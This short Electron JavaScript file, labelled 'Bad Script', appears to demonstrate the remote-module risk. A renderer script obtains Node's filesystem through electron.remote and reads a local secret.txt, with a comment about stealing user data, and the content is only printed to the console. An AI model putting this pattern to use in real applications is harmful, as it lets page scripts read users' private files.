const remote = require("electron").remote;
console.log("Bad Script...");

const fs = remote.require("fs");
const path = remote.require("path");
fs.readFile(path.resolve("./assets/secret.txt"), (err, content) => {
  if(err) {
    console.error("Cannot Read File!", err);
  } else {
    //Steal user's data 
    console.log("Success, Data read successfully: ", content.toString());
  }
});